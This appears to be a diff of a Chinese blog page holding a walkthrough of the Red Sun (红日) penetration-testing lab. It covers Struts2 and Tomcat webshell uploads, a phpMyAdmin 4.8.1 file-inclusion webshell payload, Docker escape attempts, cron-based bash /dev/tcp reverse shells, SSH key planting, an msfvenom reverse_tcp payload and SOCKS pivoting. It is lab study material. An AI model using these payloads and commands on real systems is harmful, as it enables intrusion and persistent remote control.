@@ -12,19 +12,19 @@
     
 
     <link rel="shortcut icon" href="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png" />
-    <meta name="description" content="红日靶场(四)笔记外网打点2001端口Struct2Burp抓包看到Struct2字样，直接工具测试一把梭   2002端口Tomcat可以参考https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;271892.html 使用PUT上传冰蝎马，注意直接上传&#x2F;shell.jsp不行哦  2003端口phpMyAdmin 4.8.1可以参考https:&#x2F;&#x2F;www.dazhuanla">
+    <meta name="description" content="# 红日靶场 (四) 笔记 # 外网打点 # 2001 端口 Struct2 Burp 抓包看到 Struct2 字样，直接工具测试一把梭   # 2002 端口 Tomcat 可以参考 https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;271892.html 使用 PUT 上传冰蝎马，注意直接上传 &#x2F;shell.jsp  不行哦  # 2003 端口 phpMyAdmin">
 <meta property="og:type" content="article">
 <meta property="og:title" content="红日靶场(四)笔记">
 <meta property="og:url" content="http://blog.m1n.me/2021/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="M1N&#39;s Blog">
-<meta property="og:description" content="红日靶场(四)笔记外网打点2001端口Struct2Burp抓包看到Struct2字样，直接工具测试一把梭   2002端口Tomcat可以参考https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;271892.html 使用PUT上传冰蝎马，注意直接上传&#x2F;shell.jsp不行哦  2003端口phpMyAdmin 4.8.1可以参考https:&#x2F;&#x2F;www.dazhuanla">
+<meta property="og:description" content="# 红日靶场 (四) 笔记 # 外网打点 # 2001 端口 Struct2 Burp 抓包看到 Struct2 字样，直接工具测试一把梭   # 2002 端口 Tomcat 可以参考 https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;271892.html 使用 PUT 上传冰蝎马，注意直接上传 &#x2F;shell.jsp  不行哦  # 2003 端口 phpMyAdmin">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png">
 <meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png">
 <meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png">
 <meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png">
 <meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png">
-<meta property="og:image" content="c:/Users/M1N/AppData/Roaming/Typora/typora-user-images/image-20210816152534150.png">
+<meta property="og:image" content="c:%5CUsers%5CM1N%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210816152534150.png">
 <meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png">
 <meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png">
 <meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png">
@@ -42,10 +42,10 @@
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
-    <link rel="stylesheet" href="/css/style.css?v=1641264462037">
+    <link rel="stylesheet" href="/css/style.css?v=1641264904587">
      
     
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1641264462037">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1641264904587">
     
 <meta name="generator" content="Hexo 5.4.0"></head>
 
@@ -159,7 +159,7 @@
         &copy; 2022 M1N
         Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
         & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
-        <script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?f254d2c7295bf4323b22dfe1f8760f82";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script>
+        
     </div>
 </div><!-- .nexmoe-drawer -->
     </div>
@@ -183,159 +183,194 @@
 
       
 
-      <h1 id="红日靶场-四-笔记"><a href="#红日靶场-四-笔记" class="headerlink" title="红日靶场(四)笔记"></a>红日靶场(四)笔记</h1><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><h3 id="2001端口Struct2"><a href="#2001端口Struct2" class="headerlink" title="2001端口Struct2"></a>2001端口Struct2</h3><p>Burp抓包看到Struct2字样，直接工具测试一把梭</p>
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png"></p>
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png"></p>
-<h3 id="2002端口Tomcat"><a href="#2002端口Tomcat" class="headerlink" title="2002端口Tomcat"></a>2002端口Tomcat</h3><p>可以参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/271892.html">https://www.freebuf.com/articles/web/271892.html</a></p>
-<p>使用PUT上传冰蝎马，注意直接上传<code>/shell.jsp</code>不行哦</p>
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png"></p>
-<h3 id="2003端口phpMyAdmin-4-8-1"><a href="#2003端口phpMyAdmin-4-8-1" class="headerlink" title="2003端口phpMyAdmin 4.8.1"></a>2003端口phpMyAdmin 4.8.1</h3><p>可以参考<a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/oliiiflorrr/topics/1144804">https://www.dazhuanlan.com/oliiiflorrr/topics/1144804</a></p>
+      <h1 id="红日靶场四笔记"><a class="markdownIt-Anchor" href="#红日靶场四笔记">#</a> 红日靶场 (四) 笔记</h1>
+<h2 id="外网打点"><a class="markdownIt-Anchor" href="#外网打点">#</a> 外网打点</h2>
+<h3 id="2001端口struct2"><a class="markdownIt-Anchor" href="#2001端口struct2">#</a> 2001 端口 Struct2</h3>
+<p>Burp 抓包看到 Struct2 字样，直接工具测试一把梭</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png" alt="" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png" alt="" class="lazyload"></p>
+<h3 id="2002端口tomcat"><a class="markdownIt-Anchor" href="#2002端口tomcat">#</a> 2002 端口 Tomcat</h3>
+<p>可以参考 https://www.freebuf.com/articles/web/271892.html</p>
+<p>使用 PUT 上传冰蝎马，注意直接上传 <code>/shell.jsp</code>  不行哦</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png" alt="" class="lazyload"></p>
+<h3 id="2003端口phpmyadmin-481"><a class="markdownIt-Anchor" href="#2003端口phpmyadmin-481">#</a> 2003 端口 phpMyAdmin 4.8.1</h3>
+<p>可以参考 https://www.dazhuanlan.com/oliiiflorrr/topics/1144804</p>
 <ol>
 <li>验证漏洞是否存在</li>
 </ol>
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png" alt="" class="lazyload"></p>
 <ol start="2">
-<li>使用SELECT语句后包含session文件来get shell，写shell<code>SELECT &quot;&lt;?php phpinfo();file_put_contents(&#39;m1n.php&#39;, &#39;&lt;?=@eval($_POST[1]);&#39;);?&gt;&quot;  </code>，访问发现<code>http://10.0.5.100:2003/index.php?target=db_sql.php?/../../../../../../../../../tmp/sess_a851fdf11a88214580de888e61ed1867</code>出现phpinfo，用蚁剑连接m1n.php即可。</li>
+<li>使用 SELECT 语句后包含 session 文件来 get shell，写 shell <code>SELECT &quot;&lt;?php phpinfo();file_put_contents('m1n.php', '&lt;?=@eval($_POST[1]);');?&gt;&quot;  </code> ，访问发现 <code>http://10.0.5.100:2003/index.php?target=db_sql.php?/../../../../../../../../../tmp/sess_a851fdf11a88214580de888e61ed1867</code>  出现 phpinfo，用蚁剑连接 m1n.php 即可。</li>
 </ol>
-<h2 id="Docker逃逸（2002端口的Tomcat）"><a href="#Docker逃逸（2002端口的Tomcat）" class="headerlink" title="Docker逃逸（2002端口的Tomcat）"></a>Docker逃逸（2002端口的Tomcat）</h2><h3 id="如何判断是否在Docker里"><a href="#如何判断是否在Docker里" class="headerlink" title="如何判断是否在Docker里"></a>如何判断是否在Docker里</h3><ul>
-<li>检查 <code>/.dockerenv</code> 文件是否存在</li>
-<li>检查 <code>/proc/1/cgroup</code> 内是否包含 Docker 等字符串</li>
+<h2 id="docker逃逸2002端口的tomcat"><a class="markdownIt-Anchor" href="#docker逃逸2002端口的tomcat">#</a> Docker 逃逸（2002 端口的 Tomcat）</h2>
+<h3 id="如何判断是否在docker里"><a class="markdownIt-Anchor" href="#如何判断是否在docker里">#</a> 如何判断是否在 Docker 里</h3>
+<ul>
+<li>检查  <code>/.dockerenv</code>  文件是否存在</li>
+<li>检查  <code>/proc/1/cgroup</code>  内是否包含 Docker 等字符串</li>
 </ul>
-<h3 id="尝试DirtyCow漏洞逃逸"><a href="#尝试DirtyCow漏洞逃逸" class="headerlink" title="尝试DirtyCow漏洞逃逸"></a>尝试DirtyCow漏洞逃逸</h3><ol>
-<li>下载POC：<a target="_blank" rel="noopener" href="https://github.com/scumjr/dirtycow-vdso">https://github.com/scumjr/dirtycow-vdso</a></li>
+<h3 id="尝试dirtycow漏洞逃逸"><a class="markdownIt-Anchor" href="#尝试dirtycow漏洞逃逸">#</a> 尝试 DirtyCow 漏洞逃逸</h3>
+<ol>
+<li>下载 POC：<a target="_blank" rel="noopener" href="https://github.com/scumjr/dirtycow-vdso">https://github.com/scumjr/dirtycow-vdso</a></li>
 <li>编译，上传，监听，运行，没反应，下一个。</li>
 </ol>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/scumjr/</span>dirtycow-vdso.git<br>cd dirtycow-vdso<br>make<br>./<span class="hljs-number">0</span>xdeadbeef ip:port<br></code></pre></td></tr></table></figure>
-
-<h3 id="尝试runC容器逃逸漏洞（CVE-2019-5736）"><a href="#尝试runC容器逃逸漏洞（CVE-2019-5736）" class="headerlink" title="尝试runC容器逃逸漏洞（CVE-2019-5736）"></a>尝试runC容器逃逸漏洞（CVE-2019-5736）</h3><ol>
-<li>下载POC：<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>
-<li>改POC，把payload那行改成自己VPS的IP</li>
-<li>编译（建议Linux环境下）<code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></li>
+<h3 id="尝试runc容器逃逸漏洞cve-2019-5736"><a class="markdownIt-Anchor" href="#尝试runc容器逃逸漏洞cve-2019-5736">#</a> 尝试 runC 容器逃逸漏洞（CVE-2019-5736）</h3>
+<ol>
+<li>下载 POC：<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>
+<li>改 POC，把 payload 那行改成自己 VPS 的 IP</li>
+<li>编译（建议 Linux 环境下） <code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></li>
 <li>上传文件，监听端口，执行，没反应，下一个。</li>
 </ol>
-<h3 id="尝试特权模式逃逸"><a href="#尝试特权模式逃逸" class="headerlink" title="尝试特权模式逃逸"></a>尝试特权模式逃逸</h3><ol>
-<li><code>fdisk -l</code>查看磁盘</li>
+<h3 id="尝试特权模式逃逸"><a class="markdownIt-Anchor" href="#尝试特权模式逃逸">#</a> 尝试特权模式逃逸</h3>
+<ol>
+<li><code>fdisk -l</code>  查看磁盘</li>
 </ol>
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png" alt="" class="lazyload"></p>
 <ol start="2">
-<li><p>在根目录下创建文件夹，把/dev/sda1挂在到该文件夹</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mkdir</span> /m<span class="hljs-number">1</span>n<br><span class="hljs-attribute">mount</span> /dev/sda<span class="hljs-number">1</span> /m<span class="hljs-number">1</span>n<br></code></pre></td></tr></table></figure></li>
-<li><p>可以看到宿主机的文件都到了/m1n目录下</p>
+<li>
+<p>在根目录下创建文件夹，把 /dev/sda1 挂在到该文件夹</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mkdir</span> /m<span class="hljs-number">1</span>n<br><span class="hljs-attribute">mount</span> /dev/sda<span class="hljs-number">1</span> /m<span class="hljs-number">1</span>n<br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>可以看到宿主机的文件都到了 /m1n 目录下</p>
 </li>
 </ol>
-<p><img src="C:\Users\M1N\AppData\Roaming\Typora\typora-user-images\image-20210816152534150.png" alt="image-20210816152534150"></p>
-<h4 id="尝试写定时任务来反弹shell"><a href="#尝试写定时任务来反弹shell" class="headerlink" title="尝试写定时任务来反弹shell"></a>尝试写定时任务来反弹shell</h4><p>参考：<a target="_blank" rel="noopener" href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="C:%5CUsers%5CM1N%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210816152534150.png" alt="image-20210816152534150" class="lazyload"></p>
+<h4 id="尝试写定时任务来反弹shell"><a class="markdownIt-Anchor" href="#尝试写定时任务来反弹shell">#</a> 尝试写定时任务来反弹 shell</h4>
+<p>参考：<a target="_blank" rel="noopener" href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18 / 解决 ubuntu-crontab 反弹 shell 失败的问题 /</a></p>
 <ol>
-<li>写文件到<code>/var/spool/cron/crontabs/root</code>，注意写到<code>/var/spool/cron/root</code>不行嗷</li>
-<li>同时注意root文件的权限必须为600</li>
-<li>注意定时任务文件内容中，路径要用绝对路径，建议把命令写成<code>.sh</code>文件，然后<code>chmod +x</code>，然后调用，不容易出错</li>
-<li>也可以<code>*/1 * * * *  bash -c &quot;bash -i  &gt;&amp;/dev/tcp/123.207.x.x/1234 0&gt;&amp;1&quot;</code></li>
-<li>在本地的Ubuntu20虚拟机中成功反弹shell，但是靶场环境下没法成功，写入了定时任务必须restart才可以执行，否则不执行，无奈。</li>
+<li>写文件到 <code>/var/spool/cron/crontabs/root</code> ，注意写到 <code>/var/spool/cron/root</code>  不行嗷</li>
+<li>同时注意 root 文件的权限必须为 600</li>
+<li>注意定时任务文件内容中，路径要用绝对路径，建议把命令写成 <code>.sh</code>  文件，然后 <code>chmod +x</code> ，然后调用，不容易出错</li>
+<li>也可以 <code>*/1 * * * *  bash -c &quot;bash -i  &gt;&amp;/dev/tcp/123.207.x.x/1234 0&gt;&amp;1&quot;</code></li>
+<li>在本地的 Ubuntu20 虚拟机中成功反弹 shell，但是靶场环境下没法成功，写入了定时任务必须 restart 才可以执行，否则不执行，无奈。</li>
 </ol>
 <p><strong>定时任务相关笔记：</strong></p>
 <ol>
-<li><p>定时任务有时无法看到报错信息，可以这样获取报错信息</p>
-<p><code>\* * * * * &#39;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1&#39;&gt;/tmp/error.txt 2&gt;&amp;1</code></p>
+<li>
+<p>定时任务有时无法看到报错信息，可以这样获取报错信息</p>
+<p><code>\* * * * * '/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1'&gt;/tmp/error.txt 2&gt;&amp;1</code></p>
 </li>
-<li><p>定时任务查看日志：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhangshengxiang/p/11842326.html">https://www.cnblogs.com/zhangshengxiang/p/11842326.html</a></p>
-<p>（1）查看系统日志直接：<code>tail -f /var/log/syslog</code></p>
-<p>（2）查看crontab日志：</p>
-<p>​    方法1</p>
+<li>
+<p>定时任务查看日志：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhangshengxiang/p/11842326.html">https://www.cnblogs.com/zhangshengxiang/p/11842326.html</a></p>
+<p>（1）查看系统日志直接： <code>tail -f /var/log/syslog</code></p>
+<p>（2）查看 crontab 日志：</p>
+<p>​	方法 1</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>. 修改rsyslog文件，将<span class="hljs-regexp">/etc/</span>rsyslog.d/<span class="hljs-number">50</span>-default.conf 文件中的<span class="hljs-comment">#cron.*前的#删掉；</span><br><span class="hljs-number">2</span>. 重启rsyslog服务service rsyslog restart<br><span class="hljs-number">3</span>. 重启cron服务service cron restart<br></code></pre></td></tr></table></figure>
-
-<p>​    方法2</p>
+<p>​	方法 2</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>. 编辑 <span class="hljs-regexp">/etc/</span>syslog.conf，并且打开以cron.*开始的那行注释。<br><span class="hljs-number">2</span>. 运行 <span class="hljs-regexp">/etc/i</span>nit.d/sysklogd restart<br><span class="hljs-number">3</span>. 运行 <span class="hljs-regexp">/etc/i</span>nit.d/cron restart<br></code></pre></td></tr></table></figure>
-
-<p>​    查看cron日志</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>. linux<br>看 <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/cron这个文件就可以，可以用tail -f /</span>var<span class="hljs-regexp">/log/</span>cron观察（或者<span class="hljs-regexp">/var/</span>log/cron.log）<br><br><span class="hljs-number">2</span>. unix<br>在 <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>tmp文件中，有croutXXX001864的tmp文件，tail 这些文件就可以看到正在执行的任务了。<br><br><span class="hljs-number">3</span>. mail任务<br>在 <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/mail/</span>root 文件中，有crontab执行日志的记录，用tail -f <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/mail/</span>root 即可查看最近的crontab执行情况<br></code></pre></td></tr></table></figure></li>
-</ol>
-<h4 id="尝试写-ssh公钥来连接"><a href="#尝试写-ssh公钥来连接" class="headerlink" title="尝试写.ssh公钥来连接"></a>尝试写.ssh公钥来连接</h4><ol>
-<li><p>本地生成公私钥</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span>-keygen -f m<span class="hljs-number">1</span>n<br><span class="hljs-attribute">chmod</span> <span class="hljs-number">600</span> m<span class="hljs-number">1</span>n<br></code></pre></td></tr></table></figure></li>
-<li><p>把m1n.pub文件上传到服务器的<code>/root/.ssh/</code>目录下（注意，是/m1n下的/root/.ssh），没有这个目录就创建这个目录</p>
-</li>
-<li><p>把m1n.pub的文件内容写到authorized_keys文件中<code>cat m1n.pub &gt; authorized_keys</code></p>
-</li>
-<li><p>然后<code>ssh -i m1n root@ip</code>连接，即可</p>
+<p>​	查看 cron 日志</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>. linux<br>看 <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/cron这个文件就可以，可以用tail -f /</span>var<span class="hljs-regexp">/log/</span>cron观察（或者<span class="hljs-regexp">/var/</span>log/cron.log）<br><br><span class="hljs-number">2</span>. unix<br>在 <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>tmp文件中，有croutXXX001864的tmp文件，tail 这些文件就可以看到正在执行的任务了。<br><br><span class="hljs-number">3</span>. mail任务<br>在 <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/mail/</span>root 文件中，有crontab执行日志的记录，用tail -f <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/mail/</span>root 即可查看最近的crontab执行情况<br></code></pre></td></tr></table></figure>
 </li>
 </ol>
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png"></p>
+<h4 id="尝试写ssh公钥来连接"><a class="markdownIt-Anchor" href="#尝试写ssh公钥来连接">#</a> 尝试写.ssh 公钥来连接</h4>
+<ol>
+<li>
+<p>本地生成公私钥</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span>-keygen -f m<span class="hljs-number">1</span>n<br><span class="hljs-attribute">chmod</span> <span class="hljs-number">600</span> m<span class="hljs-number">1</span>n<br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>把 m1n.pub 文件上传到服务器的 <code>/root/.ssh/</code>  目录下（注意，是 /m1n 下的 /root/.ssh），没有这个目录就创建这个目录</p>
+</li>
+<li>
+<p>把 m1n.pub 的文件内容写到 authorized_keys 文件中 <code>cat m1n.pub &gt; authorized_keys</code></p>
+</li>
+<li>
+<p>然后 <code>ssh -i m1n root@ip</code>  连接，即可</p>
+</li>
+</ol>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png" alt="" class="lazyload"></p>
 <ol start="5">
-<li>踩坑笔记：不要写公钥到<code>/home/ubuntu/.ssh/</code>目录下，连不上。</li>
+<li>踩坑笔记：不要写公钥到 <code>/home/ubuntu/.ssh/</code>  目录下，连不上。</li>
 </ol>
-<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="传🐎"><a href="#传🐎" class="headerlink" title="传🐎"></a>传🐎</h3><h4 id="MSF🐎"><a href="#MSF🐎" class="headerlink" title="MSF🐎"></a>MSF🐎</h4><ol>
-<li><p>生成msf🐎</p>
+<h2 id="内网渗透"><a class="markdownIt-Anchor" href="#内网渗透">#</a> 内网渗透</h2>
+<h3 id="传"><a class="markdownIt-Anchor" href="#传">#</a> 传🐎</h3>
+<h4 id="msf"><a class="markdownIt-Anchor" href="#msf">#</a> MSF🐎</h4>
+<ol>
+<li>
+<p>生成 msf🐎</p>
 <p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.192.168.145 LPORT=4444 -f elf &gt; mshell.elf</code></p>
 </li>
-<li><p>把🐎儿传到目标机子上面</p>
+<li>
+<p>把🐎儿传到目标机子上面</p>
 </li>
-<li><p>攻击机执行以下</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/multi/handler<br><span class="hljs-builtin-name">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> lhost 10.192.168.145<br><span class="hljs-builtin-name">set</span> lport 4444<br>run<br></code></pre></td></tr></table></figure></li>
-<li><p>目标机器添加权限后执行mshell.elf</p>
+<li>
+<p>攻击机执行以下</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/multi/handler<br><span class="hljs-builtin-name">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> lhost 10.192.168.145<br><span class="hljs-builtin-name">set</span> lport 4444<br>run<br></code></pre></td></tr></table></figure>
 </li>
-<li><p>kali接收到shell</p>
+<li>
+<p>目标机器添加权限后执行 mshell.elf</p>
+</li>
+<li>
+<p>kali 接收到 shell</p>
 </li>
 </ol>
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png" alt="" class="lazyload"></p>
 <ol start="5">
-<li><p>msf拿到shell后，需要导入路由，使用msf6的自动路由导入</p>
+<li>
+<p>msf 拿到 shell 后，需要导入路由，使用 msf6 的自动路由导入</p>
 <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata">background<br><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/multi/manage/autoroute<br><br><span class="hljs-keyword">set</span> session x<br><br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png" alt="" class="lazyload"></p>
 </li>
 </ol>
-<h3 id="代理转发"><a href="#代理转发" class="headerlink" title="代理转发"></a>代理转发</h3><h4 id="使用ew代理转发"><a href="#使用ew代理转发" class="headerlink" title="使用ew代理转发"></a>使用ew代理转发</h4><ol>
-<li>上传ew_for_linux64</li>
-<li>执行<code>./ew -s ssocksd -l 8888</code></li>
-<li>更改kali的/etc/proxychains4.conf文件，添加socks5 ip prot</li>
-<li>在需要代理时，执行命令如<code>proxychains4 curl http://127.0.0.1:2003/</code>即可</li>
+<h3 id="代理转发"><a class="markdownIt-Anchor" href="#代理转发">#</a> 代理转发</h3>
+<h4 id="使用ew代理转发"><a class="markdownIt-Anchor" href="#使用ew代理转发">#</a> 使用 ew 代理转发</h4>
+<ol>
+<li>上传 ew_for_linux64</li>
+<li>执行 <code>./ew -s ssocksd -l 8888</code></li>
+<li>更改 kali 的 /etc/proxychains4.conf 文件，添加 socks5 ip prot</li>
+<li>在需要代理时，执行命令如 <code>proxychains4 curl http://127.0.0.1:2003/</code>  即可</li>
 </ol>
-<h3 id="Ubuntu信息收集"><a href="#Ubuntu信息收集" class="headerlink" title="Ubuntu信息收集"></a>Ubuntu信息收集</h3><ol>
-<li><p>从路由表可以看到有几个网段，有个183网段应该就是内网网段了</p>
+<h3 id="ubuntu信息收集"><a class="markdownIt-Anchor" href="#ubuntu信息收集">#</a> Ubuntu 信息收集</h3>
+<ol>
+<li>
+<p>从路由表可以看到有几个网段，有个 183 网段应该就是内网网段了</p>
 </li>
-<li><p>msf进行一波存活扫描</p>
+<li>
+<p>msf 进行一波存活扫描</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> auxiliary/scanner/discovery/udp_probeset rhosts <span class="hljs-number">192.168.183.0</span>-<span class="hljs-number">255</span>set threads <span class="hljs-number">5</span>run<br></code></pre></td></tr></table></figure>
-
